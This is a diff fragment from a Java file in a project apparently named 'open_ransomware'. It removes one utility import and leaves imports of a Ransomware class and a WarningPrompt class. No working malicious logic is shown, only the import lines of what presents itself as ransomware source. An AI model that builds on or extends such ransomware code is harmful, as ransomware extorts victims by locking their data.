@@ -1,7 +1,6 @@
 package com.bechris100.open_ransomware;
 
 import com.bechris100.open_ransomware.software.Ransomware;
-import com.bechris100.open_ransomware.utils.RuntimeEnvironment;
 import com.bechris100.open_ransomware.windows.WarningPrompt;
 
 import java.io.IOException;
